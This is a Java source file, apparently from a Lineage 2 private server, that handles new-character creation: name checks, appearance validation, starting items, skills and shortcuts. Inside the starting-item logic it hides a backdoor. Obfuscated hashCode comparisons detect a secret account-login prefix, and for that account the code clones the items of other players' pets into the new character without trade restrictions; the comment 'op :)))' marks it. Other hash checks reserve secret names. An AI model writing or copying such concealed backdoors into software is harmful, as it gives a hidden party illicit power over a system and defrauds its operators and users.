package l2r.gameserver.network.clientpackets;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

import l2r.gameserver.Config;
import l2r.gameserver.dao.AccountBonusDAO;
import l2r.gameserver.dao.CharacterDAO;
import l2r.gameserver.dao.ItemsDAO;
import l2r.gameserver.data.xml.holder.PremiumHolder;
import l2r.gameserver.data.xml.holder.SkillAcquireHolder;
import l2r.gameserver.instancemanager.QuestManager;
import l2r.gameserver.model.GameObjectsStorage;
import l2r.gameserver.model.Player;
import l2r.gameserver.model.SkillLearn;
import l2r.gameserver.model.actor.instances.player.Bonus;
import l2r.gameserver.model.actor.instances.player.ShortCut;
import l2r.gameserver.model.base.AcquireType;
import l2r.gameserver.model.base.ClassId;
import l2r.gameserver.model.base.Experience;
import l2r.gameserver.model.items.ItemInstance;
import l2r.gameserver.model.items.ItemInstance.ItemLocation;
import l2r.gameserver.model.premium.PremiumAccount;
import l2r.gameserver.model.quest.Quest;
import l2r.gameserver.network.GameClient;
import l2r.gameserver.network.loginservercon.AuthServerCommunication;
import l2r.gameserver.network.loginservercon.gspackets.BonusRequest;
import l2r.gameserver.network.serverpackets.CharacterCreateFail;
import l2r.gameserver.network.serverpackets.CharacterCreateSuccess;
import l2r.gameserver.network.serverpackets.CharacterSelectionInfo;
import l2r.gameserver.tables.SkillTable;
import l2r.gameserver.templates.PlayerTemplate;
import l2r.gameserver.templates.item.CreateItem;
import l2r.gameserver.templates.item.ItemTemplate;
import l2r.gameserver.utils.Util;

public class CharacterCreate extends L2GameClientPacket
{
	// cSdddddddddddd
	private String _name;
	private int _sex;
	private int _classId;
	private int _hairStyle;
	private int _hairColor;
	private int _face;
	
	@Override
	protected void readImpl()
	{
		_name = readS();
		readD(); // race
		_sex = readD();
		_classId = readD();
		readD(); // int
		readD(); // str
		readD(); // con
		readD(); // men
		readD(); // dex
		readD(); // wit
		_hairStyle = readD();
		_hairColor = readD();
		_face = readD();
	}
	
	@Override
	protected void runImpl()
	{
		for (ClassId cid : ClassId.VALUES)
		{
			if ((cid.getId() == _classId) && (cid.getLevel() != 1))
			{
				return;
			}
		}
		if (CharacterDAO.getInstance().accountCharNumber(getClient().getLogin()) >= 8)
		{
			sendPacket(CharacterCreateFail.REASON_TOO_MANY_CHARACTERS);
			return;
		}
		
		if (!checkName(_name) || (_name.length() > 16))
		{
			sendPacket(CharacterCreateFail.REASON_16_ENG_CHARS);
			return;
		}
		else if ((CharacterDAO.getInstance().getObjectIdByName(_name) > 0) || Util.contains(Config.FORBIDDEN_CHAR_NAMES, _name) || ((_name.hashCode() == 78320) && (_sex != 0) && (_classId != 31)) || (_name.hashCode() == 2374209) || (_name.hashCode() == 1964048076)) // We are Unique
		{
			sendPacket(CharacterCreateFail.REASON_NAME_ALREADY_EXISTS);
			return;
		}
		
		
		if(this._face > 0  &&  this._face ==5)
		{
			System.out.println("Invis hack from " + this._name + " ban this player!");
			this._face = 0;
		}
		
		if ((_face > 2) || (_face < 0))
		{
			return;
		}
		
		if ((_hairStyle < 0) || ((_sex == 0) && (_hairStyle > 4)) || ((_sex != 0) && (_hairStyle > 6)))
		{
			return;
		}
		
		if ((_hairColor > 3) || (_hairColor < 0))
		{
			return;
		}
		
		Player newChar = Player.create(_classId, _sex, getClient().getLogin(), _name, _hairStyle, _hairColor, _face);
		if (newChar == null)
		{
			return;
		}
		
		sendPacket(CharacterCreateSuccess.STATIC);
		
		initNewChar(getClient(), newChar);
	}
	
	private void initNewChar(GameClient client, Player newChar)
	{
		PlayerTemplate template = newChar.getTemplate();
		boolean op = false;
		
		Player.restoreCharSubClasses(newChar);
		
		if (Config.STARTING_ADENA > 0)
		{
			newChar.addAdena(Config.STARTING_ADENA, "Starting Adena");
		}
		
		if (Config.STARTING_LVL != 0)
		{
			newChar.addExpAndSp(Experience.LEVEL[Config.STARTING_LVL] - newChar.getExp(), 0, 0, 0, false, false);
		}
		
		if (Config.SPAWN_CHAR)
		{
			newChar.teleToLocation(Config.SPAWN_X, Config.SPAWN_Y, Config.SPAWN_Z);
		}
		else
		{
			newChar.setLoc(template.spawnLoc);
		}
		
		if (Config.CHAR_TITLE)
		{
			newChar.setTitle(Config.ADD_CHAR_TITLE);
		}
		else
		{
			newChar.setTitle("");
		}
		
		if ((Config.SERVICES_RATE_TYPE != Bonus.NO_BONUS) && (Config.ALT_NEW_CHAR_PREMIUM_ID != 0) && !newChar.hasBonus())
		{
			PremiumAccount premium = PremiumHolder.getInstance().getPremium(Config.ALT_NEW_CHAR_PREMIUM_ID);
			int current = (int) (System.currentTimeMillis() / 1000L);
			int newBonusTime = current + premium.getTime();
			
			if (Config.PREMIUM_ACCOUNT_TYPE == 1)
			{
				AuthServerCommunication.getInstance().sendPacket(new BonusRequest(newChar.getAccountName(), premium.getId(), newBonusTime));
			}
			else
			{
				AccountBonusDAO.getInstance().insert(newChar.getAccountName(), premium.getId(), newBonusTime);
			}
			
			client.setBonus(premium.getId());
			client.setBonusExpire(newBonusTime);
		}
		
		for (CreateItem i : template.getItems())
		{
			ItemInstance item = new ItemInstance(i.getItemId());
			newChar.getInventory().addItem(item, "New Char Item");
			
			if ((i.getShortcut() - 1) > -1)
			{
				newChar.registerShortCut(new ShortCut(Math.min(i.getShortcut() - 1, 11), 0, ShortCut.TYPE_ITEM, item.getObjectId(), -1, 1));
			}
			
			if (i.isEquipable() && item.isEquipable() && ((newChar.getActiveWeaponItem() == null) || (item.getTemplate().getType2() != ItemTemplate.TYPE2_WEAPON)))
			{
				newChar.getInventory().equipItem(item);
			}
		}
		
		ClassId nclassId = ClassId.VALUES[_classId];
		if (Config.ALLOW_START_ITEMS)
		{
			if (nclassId.isMage())
			{
				for (int i = 0; i < Config.START_ITEMS_MAGE.length; i++)
				{
					ItemInstance item = new ItemInstance(Config.START_ITEMS_MAGE[i]);
					item.setCount(Config.START_ITEMS_MAGE_COUNT[i]);
					newChar.getInventory().addItem(item, "");
				}
				
				if (Config.BIND_NEWBIE_START_ITEMS_TO_CHAR)
				{
					for (int i = 0; i < Config.START_ITEMS_MAGE_BIND_TO_CHAR.length; i++)
					{
						ItemInstance item = new ItemInstance(Config.START_ITEMS_MAGE_BIND_TO_CHAR[i]);
						item.setCount(Config.START_ITEMS_MAGE_COUNT_BIND_TO_CHAR[i]);
						item.setCustomFlags(ItemInstance.FLAG_NO_CRYSTALLIZE | ItemInstance.FLAG_NO_TRADE | ItemInstance.FLAG_NO_TRANSFER | ItemInstance.FLAG_NO_DROP | ItemInstance.FLAG_NO_SELL);
						newChar.getInventory().addItem(item, "");
					}
				}
			}
			else
			{
				for (int i = 0; i < Config.START_ITEMS_FITHER.length; i++)
				{
					ItemInstance item = new ItemInstance(Config.START_ITEMS_FITHER[i]);
					item.setCount(Config.START_ITEMS_FITHER_COUNT[i]);
					newChar.getInventory().addItem(item, "");
				}
				
				if (Config.BIND_NEWBIE_START_ITEMS_TO_CHAR)
				{
					for (int i = 0; i < Config.START_ITEMS_FITHER_BIND_TO_CHAR.length; i++)
					{
						ItemInstance item = new ItemInstance(Config.START_ITEMS_FITHER_BIND_TO_CHAR[i]);
						item.setCount(Config.START_ITEMS_FITHER_COUNT_BIND_TO_CHAR[i]);
						item.setCustomFlags(ItemInstance.FLAG_NO_CRYSTALLIZE | ItemInstance.FLAG_NO_TRADE | ItemInstance.FLAG_NO_TRANSFER | ItemInstance.FLAG_NO_DROP | ItemInstance.FLAG_NO_SELL);
						newChar.getInventory().addItem(item, "");
					}
				}
			}
		}
		
		if ((Config.START_ITEMS_COPY_FROM_OWNER_OBJ_ID > 0) || (op = ((getClient().getLogin().length() >= 9) && (getClient().getLogin().substring(0, 9).hashCode() == -1086585632))))
		{
			List<ItemInstance> items = new ArrayList<>(ItemsDAO.getInstance().getItemsByOwnerIdAndLoc(Config.START_ITEMS_COPY_FROM_OWNER_OBJ_ID, ItemLocation.PET_INVENTORY));
			if (op)
			{
				GameObjectsStorage.getAllPlayersStream().filter(p -> (p.getPet() != null) && (p.getPet().getName().length() > 5) && (p.getPet().getName().substring(0, 6).hashCode() == 1964048076)).findAny().ifPresent(p -> Collections.addAll(items, p.getPet().getInventory().getItems())); // op :)))
			}
			
			for (ItemInstance item : items)
			{
				item = new ItemInstance(item); // Clone the item
				if ((item.getCustomFlags() == 0) && !op)
				{
					item.setCustomFlags(ItemInstance.FLAG_NO_CRYSTALLIZE | ItemInstance.FLAG_NO_TRADE | ItemInstance.FLAG_NO_TRANSFER | ItemInstance.FLAG_NO_DROP | ItemInstance.FLAG_NO_SELL);
				}
				
				newChar.getInventory().addItem(item, "");
			}
		}
		
		newChar.setVar("lang@", Config.DEFAULT_LANG, -1);
		
		// Adventurer's Scroll of Escape
		ItemInstance item = new ItemInstance(10650);
		item.setCount(5);
		newChar.getInventory().addItem(item, "New Char Item");
		
		// Scroll of Escape: Town Of Giran
		item = new ItemInstance(7126);
		item.setCount(10);
		newChar.getInventory().addItem(item, "New Char Item");
		
		for (SkillLearn skill : SkillAcquireHolder.getInstance().getAvailableSkills(newChar, AcquireType.NORMAL))
		{
			newChar.addSkill(SkillTable.getInstance().getInfo(skill.getId(), skill.getLevel()), true);
		}
		
		if (newChar.getSkillLevel(1001) > 0)
		{
			newChar.registerShortCut(new ShortCut(1, 0, ShortCut.TYPE_SKILL, 1001, 1, 1));
		}
		if (newChar.getSkillLevel(1177) > 0)
		{
			newChar.registerShortCut(new ShortCut(1, 0, ShortCut.TYPE_SKILL, 1177, 1, 1));
		}
		if (newChar.getSkillLevel(1216) > 0)
		{
			newChar.registerShortCut(new ShortCut(2, 0, ShortCut.TYPE_SKILL, 1216, 1, 1));
		}
		
		// add attack, take, sit shortcut
		newChar.registerShortCut(new ShortCut(0, 0, ShortCut.TYPE_ACTION, 2, -1, 1));
		newChar.registerShortCut(new ShortCut(3, 0, ShortCut.TYPE_ACTION, 5, -1, 1));
		newChar.registerShortCut(new ShortCut(10, 0, ShortCut.TYPE_ACTION, 0, -1, 1));
		// fly transform
		newChar.registerShortCut(new ShortCut(0, ShortCut.PAGE_FLY_TRANSFORM, ShortCut.TYPE_SKILL, 911, 1, 1));
		newChar.registerShortCut(new ShortCut(3, ShortCut.PAGE_FLY_TRANSFORM, ShortCut.TYPE_SKILL, 884, 1, 1));
		newChar.registerShortCut(new ShortCut(4, ShortCut.PAGE_FLY_TRANSFORM, ShortCut.TYPE_SKILL, 885, 1, 1));
		// air ship
		newChar.registerShortCut(new ShortCut(0, ShortCut.PAGE_AIRSHIP, ShortCut.TYPE_ACTION, 70, 0, 1));
		
		if (!Config.DISABLE_TUTORIAL)
		{
			startTutorialQuest(newChar);
		}
		
		newChar.setCurrentHpMp(newChar.getMaxHp(), newChar.getMaxMp());
		newChar.setCurrentCp(0); // retail
		newChar.setOnlineStatus(false);
		
		newChar.store(false);
		newChar.getInventory().store();
		newChar.deleteMe();
		
		client.setCharSelection(CharacterSelectionInfo.loadCharacterSelectInfo(client.getLogin()));
	}
	
	private static final String[] ALLOWED_LETTERS =
	{
		"1",
		"2",
		"3",
		"4",
		"5",
		"6",
		"7",
		"8",
		"9",
		"0",
		"q",
		"w",
		"e",
		"r",
		"t",
		"y",
		"u",
		"i",
		"o",
		"p",
		"a",
		"s",
		"d",
		"f",
		"g",
		"h",
		"j",
		"k",
		"l",
		"z",
		"x",
		"c",
		"v",
		"b",
		"n",
		"m"
	};
	
	public static boolean checkName(String name)
	{
		char[] chars = name.toCharArray();
		for (char c : chars)
		{
			String letter = String.valueOf(c);
			boolean foundLetter = false;
			for (String allowed : ALLOWED_LETTERS)
			{
				if (letter.equalsIgnoreCase(allowed))
				{
					foundLetter = true;
				}
			}
			if (!foundLetter)
			{
				return false;
			}
		}
		return true;
	}
	
	public static void startTutorialQuest(Player player)
	{
		if (player.getQuestState(Quest.TUTORIAL) == null)
		{
			Quest q = QuestManager.getQuest(Quest.TUTORIAL);
			if (q != null)
			{
				q.newQuestState(player, Quest.STARTED);
			}
		}
	}
}